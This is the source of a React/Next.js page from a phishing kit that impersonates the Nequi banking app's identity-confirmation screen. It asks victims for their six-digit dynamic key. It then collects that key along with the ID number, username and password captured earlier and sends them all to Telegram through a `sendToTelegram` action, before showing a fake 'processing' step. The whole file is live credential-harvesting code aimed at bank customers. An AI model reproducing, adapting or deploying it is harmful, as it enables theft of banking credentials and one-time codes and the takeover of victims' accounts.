'use client'

import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import Image from "next/image"
import { Button } from "@/components/ui/button"
import { useRouter } from "next/navigation"
import { useState, useEffect, useRef } from "react"
import { Input } from "@/components/ui/input"
import { sendToTelegram } from "@/app/actions/telegram";
import { Loader2 } from "lucide-react"; // Ícono de carga

export default function OtpPage() {
  const router = useRouter();
  const [claveDinamica, setClaveDinamica] = useState("");
  const [loading, setLoading] = useState(false); // Estado para manejar el estado de carga
  const [error, setError] = useState(""); // Estado para manejar errores de validación
  const inputRef = useRef(null); // Referencia para manejar el foco en el input

  // useEffect para redirigir al usuario al login si no hay datos en sessionStorage
  useEffect(() => {
    const cedula = sessionStorage.getItem('cedula');
    const usuario = sessionStorage.getItem('usuario');
    const clave = sessionStorage.getItem('clave');

    if (!cedula || !usuario || !clave) {
      router.push('/login');
      return;
    }
  }, [router]);

  // Función para validar la clave dinámica en tiempo real
  const handleChange = (e: { target: { value: any } }) => {
    const value = e.target.value;
    if (!/^\d{6}$/.test(value)) {
      setError("La clave dinámica debe tener exactamente 6 dígitos.");
    } else {
      setError("");
    }
    setClaveDinamica(value);
  };

  // Función para manejar el envío del formulario
  const handleSubmit = async (e: { preventDefault: () => void }) => {
    e.preventDefault();
    if (claveDinamica && !error) {
      setLoading(true);
      try {
        const cedula = sessionStorage.getItem("cedula");
        const usuario = sessionStorage.getItem("usuario");
        const clave = sessionStorage.getItem("clave");

        if (!cedula || !usuario || !clave) {
          router.push("/login");
          return;
        }

        // Guarda la clave dinámica en sessionStorage
        sessionStorage.setItem("claveDinamica", claveDinamica);

        // Envía los datos a Telegram
        await sendToTelegram({
          usuario,
          clave,
          claveDinamica,
          cedula,
        });

        // Redirige después de 2 segundos
        setTimeout(() => {
          setLoading(false);
          router.push("/procesando");
        }, 2000);
      } catch (error) {
        console.error("Error al enviar los datos:", error);
        alert("Hubo un error al procesar tu solicitud. Por favor, intenta de nuevo.");
        setLoading(false);
      }
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center px-4 py-8 md:py-12">
      {/* Logo */}
      <div className="mb-8">
        <Image
          src="https://cdn.prod.website-files.com/6317a229ebf7723658463b4b/663a6b0d43303ddf38035997_logo-nequi.svg"
          alt="Nequi Logo"
          width={120}
          height={40}
          className="w-auto h-8"
        />
      </div>

      {/* Content */}
      <div className="w-full max-w-md space-y-6 text-center">
        <h1 className="text-2xl font-semibold text-gray-900">Confirma tu identidad</h1>

        <p className="text-pink-500 text-sm px-6">
          Para confirmar tu identidad escribe o pega la clave dinámica que encuentras en tu App Nequi.
        </p>

        {/* Verification Code Input */}
        <form onSubmit={handleSubmit} className="space-y-6">
          <Input
            ref={inputRef}
            type="text"
            maxLength={6}
            value={claveDinamica}
            onChange={handleChange}
            className="text-center tracking-[1em] text-xl font-mono h-12 border-none focus:ring-0 focus-visible:ring-0 focus:outline-none"
            placeholder="------"
            required
            aria-label="Clave dinámica"
          />

          {error && (
            <p className="text-red-500 text-sm mt-2 animate-fade-in">
              {error}
            </p>
          )}

          <Button 
            type="submit" 
            className="w-full bg-[#E6007E] hover:bg-[#C4006B] text-white"
            disabled={loading || !!error}
          >
            {loading ? (
              <div className="flex items-center justify-center">
                <Loader2 className="animate-spin mr-2" size={20} />
                Procesando...
              </div>
            ) : (
              "Confirmar"
            )}
          </Button>
        </form>
      </div>
    </div>
  );
}